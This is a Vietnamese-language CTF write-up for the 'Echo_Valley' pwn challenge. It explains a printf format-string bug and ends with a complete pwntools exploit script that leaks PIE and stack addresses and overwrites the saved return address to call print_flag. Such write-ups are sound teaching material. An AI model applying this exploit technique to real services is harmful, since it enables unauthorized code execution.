# [CTF] - [Echo_Valley]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `academy{f1ckl3_f0rmat_f1asc0}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `Valley`, `Valley.c`
- **Kết quả checksec:**
  ```bash
      Arch:     amd64-64-little
      RELRO:    Full RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled


### 2. Phân tích tĩnh :
- Vô Main() và chương trình nhảy thẳng vô echo_valley , khi đó chương trình cho ta nhập 
```
fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }
```
- Sau đó nó kiểm tra xem có phải là Null hay là *exit* không , sau đó :
```
printf("You heard in the distance: ");
        printf(buf);                   <-- fmtstr
```
- Ta đã thấy rõ ràng lỗi format-string ở đây 
- Ngoài ra bài này có hàm print_flag , ý đồ của tác giả là làm cách nào đó để chạy hàm đó .

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng : 
- Xem qua thì đây là 1 bài fmt-str kinh điển , khi ta nhập bất cứ thứ gì nó sẽ in ra lại mà không kiểm tra , từ đó ta có thể leak được địa chỉ trên stack gồm địa chỉ stack và địa chỉ binary vì PIE đã bật nên điều này rất quý giá 

```
pwndbg> stack 20
00:0000│ rax rsp 0x7fffffffdd10 ◂— 0xa333231 /* '123\n' */
01:0008│-068     0x7fffffffdd18 ◂— 0x80000
02:0010│-060     0x7fffffffdd20 ◂— 0x8000
03:0018│-058     0x7fffffffdd28 —▸ 0x7fffffffdd58 ◂— 0
04:0020│-050     0x7fffffffdd30 ◂— 0x4400000019
05:0028│-048     0x7fffffffdd38 ◂— 0
... ↓            7 skipped
0d:0068│-008     0x7fffffffdd78 ◂— 0xf4ff712f9d763700
0e:0070│ rbp     0x7fffffffdd80 —▸ 0x7fffffffdd90 —▸ 0x7fffffffde30 —▸ 0x7fffffffde90 ◂— 0
0f:0078│+008     0x7fffffffdd88 —▸ 0x555555555413 (main+18) ◂— mov eax, 0
```
- Ta có thể dễ dàng leak được địa chỉ base của binary thông qua RIP => tính được địa chỉ của print_flag
- Sau khi nhập ở fgets ta có thể thấy được địa chỉ stack dễ lấy nhất chỉ có thể là rbp , sau khi lấy được rbp tôi lấy được địa chỉ stack của RIP , đó là thứ thực sự tôi nhắm tới
- Sau đó dùng công cụ `fmtstr_payload` để có thể ghi đè vào nội dung mà con trỏ đang trỏ tới , con trỏ tôi nhắm tới là địa chỉ stack của RIP , cú pháp của `fmtstr_payload` :
```
fmtstr_payload(offset,{target_addr: value},write_size)
-> offset = bạn nhập AAA rồi 1 đống %p , đếm chuỗi AAA in ra thứ bao nhiêu thì đó là offset
-> target_addr = địa chỉ con trỏ muốn ghi value vào
-> write_size = 'byte' muốn in từng phần to , 'short' in phần nhỏ
```
- Thật ra thì nó là bản pro của cách thử công giữa cách kết hợp giữa %c và %n thôi nhưng được cái tiện lợi hơn

### 2. Kịch bản tấn công : 
```
#!/usr/bin/env python3
from pwn import *

exe = ELF("./valley", checksec=False)
context.binary = exe

p = process(exe.path)

#p = remote('xebec.cylabacademy.net',26675)

gdb.attach(p, gdbscript='''
    b *echo_valley+76
    c
''')

## leak exe 
p.sendline(b'%21$p')
p.recvuntil(b'distance: ')
exe_leak = int(p.recvline(),16)
win = exe_leak - 0x1aa
log.info(f'exe_leak = {hex(exe_leak)}')
log.info(f'win = {hex(win)}')


# leak stack
p.sendline(b'%20$p')
p.recvuntil(b'distance: ')
stack_leak = int(p.recvline(),16)
log.info(f'stack_leak = {hex(stack_leak)}')


target = stack_leak - 8 
payload = fmtstr_payload(6,{target:win},write_size = 'short')
p.sendline(payload) 

p.sendline(b'exit') 

p.interactive()

```


